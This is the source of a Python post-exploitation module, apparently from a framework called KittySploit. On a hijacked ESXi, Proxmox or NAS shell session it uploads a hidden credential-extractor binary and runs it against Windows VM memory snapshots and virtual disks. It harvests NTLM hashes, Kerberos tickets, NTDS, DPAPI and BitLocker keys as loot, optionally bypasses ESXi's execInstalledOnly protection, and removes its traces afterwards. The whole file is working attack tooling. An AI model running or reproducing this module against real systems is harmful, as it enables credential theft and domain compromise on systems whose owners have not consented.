#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Extract Windows credentials from offline VM memory snapshots and virtual disks
via a session on the hypervisor / NAS (ESXi, Proxmox, QEMU host, etc.).

Wraps an operator-supplied static extractor binary (e.g. VMkatz) — upload,
run in place against .vmsn/.vmem/.sav/.vmdk/.qcow2/.vhdx (or a VM folder),
capture stdout, and save loot. Optionally uses the ESXi in-memory Python loader
when execInstalledOnly blocks direct execution.
"""

from __future__ import annotations

import os
import re
import time
from typing import List

from kittysploit import *
from lib.post.linux.system import System
from lib.post.linux.session import LinuxSessionMixin

_LOCAL_OUT = "output"
_DEFAULT_REMOTE_DIR = "/tmp"
_CRED_HINT = re.compile(
    r"(?:NTLM|DCC2|DPAPI|WDigest|Kerberos|SAM|LSA|NTDS|hash|::|:aad3b435|"
    r"\$DPAPImk\$|\$DCC2\$|[A-Fa-f0-9]{32})",
    re.IGNORECASE,
)


class Module(Post, System, LinuxSessionMixin):
    __info__ = {
        "name": "Offline VM Credential Extract",
        "description": (
            "Upload and run an offline VM credential extractor on a Linux session "
            "(hypervisor/NAS) against memory snapshots or virtual disks — NTLM, "
            "WDigest, Kerberos, SAM/LSA/DCC2, NTDS, DPAPI, BitLocker FVEK — without "
            "exfiltrating full disk images. Compatible with VMkatz-style CLIs."
        ),
        "author": "KittySploit Team",
        "platform": Platform.LINUX,
        "session_type": [SessionType.SHELL, SessionType.METERPRETER, SessionType.SSH],
        "tags": [
            "post",
            "gather",
            "credentials",
            "hypervisor",
            "esxi",
            "proxmox",
            "vmware",
            "offline",
        ],
        "references": [
            "https://github.com/nikaiw/VMkatz",
            "https://attack.mitre.org/techniques/T1003/",
            "https://attack.mitre.org/techniques/T1552/",
        ],
        "agent": {
            "risk": "intrusive",
            "effects": ["active_exploitation", "credential_access"],
            "expected_requests": 8,
            "reversible": False,
            "approval_required": True,
            "produces": ["credentials", "risk_signals"],
            "cost": 2.0,
            "noise": 0.7,
            "value": 1.4,
            "requires": {
                "capabilities_any": ["shell"],
                "capabilities_all": [],
            },
            "chain": {
                "consumes_capabilities": ["shell"],
                "produces_capabilities": [{"capability": "credentials", "from_detail": "offline_vm"}],
                "option_bindings": {},
                "suggested_followups": [],
            },
        },
    }

    target_path = OptString(
        "",
        "Remote path: snapshot (.vmsn/.sav), disk (.vmdk/.qcow2/.vhdx), hives, .dmp, or VM folder",
        True,
    )
    local_bin = OptString(
        "",
        "Local path to extractor binary on the operator machine (uploaded when remote_bin is empty)",
        False,
    )
    remote_bin = OptString(
        "",
        "Existing remote binary path (skip upload). Empty = upload local_bin",
        False,
    )
    local_loader = OptString(
        "",
        "Local ESXi Python in-memory loader (e.g. vmkatz_loader.py) when use_loader=true",
        False,
    )
    use_loader = OptBool(
        False,
        "Run via Python loader (bypasses ESXi execInstalledOnly / VIB)",
        False,
    )
    output_format = OptChoice(
        "ntlm",
        "Extractor --format value",
        False,
        choices=["text", "brief", "ntlm", "hashcat", "csv"],
    )
    recursive = OptBool(False, "Recursively scan under target_path (-r)", False)
    ntds = OptBool(False, "Extract NTDS.dit from domain controller disk (--ntds)", False)
    disk = OptString(
        "",
        "Companion virtual disk for pagefile resolution (--disk)",
        False,
    )
    export_kirbi = OptBool(False, "Export Kerberos tickets as .kirbi (--kirbi)", False)
    export_ccache = OptBool(False, "Export Kerberos tickets as .ccache (--ccache)", False)
    bitlocker_fvek_dir = OptString(
        "",
        "Remote directory for BitLocker FVEK export (--bitlocker-fvek)",
        False,
    )
    extra_args = OptString("", "Extra CLI arguments appended before target_path", False)
    remote_dir = OptString(
        _DEFAULT_REMOTE_DIR,
        "Remote working directory for binary, output, and ticket exports",
        False,
    )
    remote_name = OptString(
        ".ks_ovmcreds",
        "Remote filename for the uploaded binary",
        False,
        advanced=True,
    )
    timeout = OptInteger(600, "Remote execution timeout in seconds", False)
    upload_chunk = OptInteger(4096, "Base64 upload chunk size", False, advanced=True)
    download_chunk_kb = OptInteger(512, "Chunk size (KB) when pulling remote output", False)
    cleanup = OptBool(True, "Remove uploaded binary/loader/output from the target", False)
    save_loot = OptBool(True, "Save extractor stdout under output/loot/", False)
    dry_run = OptBool(False, "Print the remote command without executing", False)

    def _opt_str(self, opt) -> str:
        if hasattr(opt, "value"):
            opt = opt.value
        return str(opt or "").strip()

    def _opt_bool(self, opt) -> bool:
        if isinstance(opt, bool):
            return opt
        return str(opt).strip().lower() in ("1", "true", "yes", "y", "on")

    def _remote_workdir(self) -> str:
        path = self._opt_str(self.remote_dir) or _DEFAULT_REMOTE_DIR
        return path.rstrip("/")

    def check(self) -> bool:
        if not self.linux_require_linux():
            return False
        if not self._opt_str(self.target_path):
            print_error("target_path is required.")
            return False
        remote = self._opt_str(self.remote_bin)
        local = self._opt_str(self.local_bin)
        if not remote and not local:
            print_error("Set local_bin (to upload) or remote_bin (already on target).")
            return False
        if local and not os.path.isfile(local):
            print_error(f"local_bin not found: {local}")
            return False
        if self._opt_bool(self.use_loader):
            loader = self._opt_str(self.local_loader)
            if not loader or not os.path.isfile(loader):
                print_error("use_loader=true requires a valid local_loader path.")
                return False
        return True

    def run(self):
        if not self.check():
            raise ProcedureError(
                FailureType.ConfigurationError,
                "Offline VM credential extract prerequisites not met",
            )

        workdir = self._remote_workdir()
        stamp = time.strftime("%Y%m%d_%H%M%S")
        remote_out = f"{workdir}/.ks_ovmcreds_{stamp}.out"
        cleanup_paths: List[str] = [remote_out]
        uploaded_bin = ""
        uploaded_loader = ""

        try:
            bin_path = self._resolve_binary(workdir, cleanup_paths)
            if not bin_path:
                raise ProcedureError(FailureType.NotFound, "Extractor binary unavailable on target")

            if self._opt_bool(self.use_loader):
                uploaded_loader = self._upload_loader(workdir)
                if not uploaded_loader:
                    raise ProcedureError(FailureType.Unknown, "Failed to upload ESXi loader")
                cleanup_paths.append(uploaded_loader)

            if self._opt_str(self.local_bin) and not self._opt_str(self.remote_bin):
                uploaded_bin = bin_path
                cleanup_paths.append(uploaded_bin)

            fvek = self._opt_str(self.bitlocker_fvek_dir)
            if fvek:
                q = self.linux_shell_quote(fvek)
                self.linux_execute(f"mkdir -p {q}")

            argv = self._build_argv(bin_path)
            cmd = self._build_command(argv, uploaded_loader, remote_out, workdir)
            print_info(cmd)

            if self._opt_bool(self.dry_run):
                print_warning("dry_run=true; command was not executed")
                return True

            print_status("Running offline VM credential extraction...")
            timeout = self.linux_int_opt(self.timeout, 600, 30)
            self.linux_execute(cmd, timeout=timeout)

            output = self._collect_output(remote_out)
            if output:
                self._print_output(output)
                if self._opt_bool(self.save_loot):
                    self._save_loot(output, stamp)
            else:
                print_warning("No extractor output captured (empty remote file / truncated session).")

            if self._opt_bool(self.export_kirbi) or self._opt_bool(self.export_ccache):
                self._hint_ticket_exports(workdir)

            print_success("Offline VM credential extract finished")
            return True
        finally:
            if self._opt_bool(self.cleanup) and not self._opt_bool(self.dry_run):
                self.linux_delete_remote(cleanup_paths)

    def _resolve_binary(self, workdir: str, cleanup_paths: List[str]) -> str:
        remote = self._opt_str(self.remote_bin)
        if remote:
            if not self.linux_file_exists(remote):
                print_error(f"remote_bin not found on target: {remote}")
                return ""
            print_status(f"Using existing remote binary: {remote}")
            return remote

        local = os.path.abspath(self._opt_str(self.local_bin))
        name = self._opt_str(self.remote_name) or ".ks_ovmcreds"
        remote_path = f"{workdir}/{name}"
        print_status(f"Uploading extractor ({os.path.getsize(local)} bytes) -> {remote_path}")
        with open(local, "rb") as handle:
            data = handle.read()
        chunk = self.linux_int_opt(self.upload_chunk, 4096, 512)
        if not self.linux_upload_bytes(data, remote_path, executable=True, chunk_size=chunk):
            return ""
        print_success(f"Uploaded extractor to {remote_path}")
        return remote_path

    def _upload_loader(self, workdir: str) -> str:
        local = os.path.abspath(self._opt_str(self.local_loader))
        remote_path = f"{workdir}/.ks_ovmcreds_loader.py"
        print_status(f"Uploading ESXi loader -> {remote_path}")
        if not self.linux_upload_file(local, remote_path):
            print_error("Loader upload failed")
            return ""
        print_success(f"Uploaded loader to {remote_path}")
        return remote_path

    def _build_argv(self, bin_path: str) -> List[str]:
        argv = [bin_path]
        fmt = self._opt_str(self.output_format) or "ntlm"
        argv.extend(["--format", fmt])
        if self._opt_bool(self.recursive):
            argv.append("-r")
        if self._opt_bool(self.ntds):
            argv.append("--ntds")
        disk = self._opt_str(self.disk)
        if disk:
            argv.extend(["--disk", disk])
        if self._opt_bool(self.export_kirbi):
            argv.append("--kirbi")
        if self._opt_bool(self.export_ccache):
            argv.append("--ccache")
        fvek = self._opt_str(self.bitlocker_fvek_dir)
        if fvek:
            argv.extend(["--bitlocker-fvek", fvek])
        extra = self._opt_str(self.extra_args)
        if extra:
            # Operator-controlled extras; quote each shell word safely at command build time.
            argv.extend(extra.split())
        argv.append(self._opt_str(self.target_path))
        return argv

    def _build_command(
        self,
        argv: List[str],
        loader: str,
        remote_out: str,
        workdir: str,
    ) -> str:
        quoted = " ".join(self.linux_shell_quote(a) for a in argv)
        out_q = self.linux_shell_quote(remote_out)
        cd = f"cd {self.linux_shell_quote(workdir)} && "
        if loader:
            py = "python3" if self.linux_command_exists("python3") else "python"
            # loader.py <binary> [extractor-args...]
            loader_argv = [loader] + argv
            quoted = " ".join(self.linux_shell_quote(a) for a in loader_argv)
            return f"{cd}{py} {quoted} > {out_q} 2>&1; echo __KS_RC__:$? >> {out_q}"
        return f"{cd}{quoted} > {out_q} 2>&1; echo __KS_RC__:$? >> {out_q}"

    def _collect_output(self, remote_out: str) -> str:
        # Prefer session pull for large dumps; fall back to cat for small output.
        size = self.linux_remote_file_size(remote_out)
        if size <= 0:
            return ""
        if size > 256 * 1024:
            stamp = time.strftime("%Y%m%d_%H%M%S")
            local_tmp = os.path.join(_LOCAL_OUT, f"ovmcreds_raw_{stamp}.txt")
            os.makedirs(_LOCAL_OUT, exist_ok=True)
            if self.linux_pull_file_via_session(
                remote_out,
                local_tmp,
                chunk_kb=self.linux_int_opt(self.download_chunk_kb, 512, 1),
            ):
                with open(local_tmp, "r", encoding="utf-8", errors="replace") as handle:
                    return handle.read()
            print_warning("Binary pull failed; trying cat fallback...")
        q = self.linux_shell_quote(remote_out)
        return self.linux_execute(f"cat {q}", timeout=120)

    def _print_output(self, output: str) -> None:
        lines = output.splitlines()
        rc_line = next((ln for ln in reversed(lines) if ln.startswith("__KS_RC__:")), "")
        body = "\n".join(ln for ln in lines if not ln.startswith("__KS_RC__:"))
        if body.strip():
            # Cap console spam; full body goes to loot.
            preview = body if len(body) <= 40000 else body[:40000] + "\n... [truncated in console]"
            print_info(preview)
        cred_lines = [ln for ln in body.splitlines() if _CRED_HINT.search(ln)]
        if cred_lines:
            print_status(f"Credential-related lines: {len(cred_lines)}")
            for ln in cred_lines[:50]:
                print_success(ln)
            if len(cred_lines) > 50:
                print_info(f"... and {len(cred_lines) - 50} more (see loot)")
        if rc_line:
            try:
                code = int(rc_line.split(":", 1)[1].strip())
            except ValueError:
                code = -1
            if code != 0:
                print_warning(f"Extractor exit code: {code}")
            else:
                print_status("Extractor exit code: 0")

    def _save_loot(self, output: str, stamp: str) -> None:
        host = (self.linux_execute("hostname 2>/dev/null") or "linux").strip()
        host = host.splitlines()[-1].strip() if host else "linux"
        safe_host = re.sub(r"[^a-zA-Z0-9._-]+", "_", host) or "linux"
        rel = os.path.join("loot", f"offline_vm_creds_{safe_host}_{stamp}.txt")
        body = "\n".join(ln for ln in output.splitlines() if not ln.startswith("__KS_RC__:"))
        if self.write_out_dir(rel, body):
            print_success(f"Saved loot to output/{rel}")
        else:
            print_warning("Could not save loot")

    def _hint_ticket_exports(self, workdir: str) -> None:
        q = self.linux_shell_quote(workdir)
        listing = self.linux_execute(
            f"ls -la {q}/*.kirbi {q}/*.ccache 2>/dev/null | head -n 40",
            timeout=30,
        )
        if listing.strip():
            print_status("Ticket export candidates in remote workdir:")
            print_info(listing)
            print_info("Pull them manually or via a file download post module.")
        else:
            print_info("No .kirbi/.ccache files found in remote workdir (extractor may write elsewhere).")
